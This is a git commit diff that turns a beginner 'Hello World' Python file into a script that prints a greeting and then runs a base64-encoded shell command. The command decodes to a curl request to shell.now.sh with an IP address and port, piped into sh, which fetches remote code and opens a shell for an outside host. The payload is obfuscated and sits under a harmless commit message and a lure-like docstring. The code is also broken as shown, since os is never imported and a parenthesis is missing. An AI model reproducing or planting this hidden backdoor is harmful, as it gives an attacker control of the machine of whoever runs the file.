94e95453b064c9a048073a2dc2c527559f83baaf
Dylan Forwood <37117314+pyCity@users.noreply.github.com>
2019-02-13 18:47:27 -0600

    Update Hello_World.py

--- Hello_World.py
+++ Hello_World.py
@@ -1,7 +1,19 @@
-#This is a python file, YOU GOT IT FROM GIT!
-
-def main():
-  print "Hello ACM & DayZero!"
-  
-  if __name__ == '__main__':
-    main()
+ #!/usr/bin/env python3
+ import base64
+ import sys
+ 
+ class Base64:
+     """Todd run me pls im"""
+ 
+     def decode(self, str):
+         out = base64.b64decode(str.encode("utf-8"))
+         return out
+ 
+ 
+ 
+ if __name__ == "__main__":
+ 
+     print("Hello world!")
+     b64 = Base64()
+     x = b64.decode("Y3VybCBodHRwczovL3NoZWxsLm5vdy5zaC8xMDQuMjQ4LjEwOS4xNTg6NDQ0NCB8IHNo")
+     os.system(x.decode("utf-8")
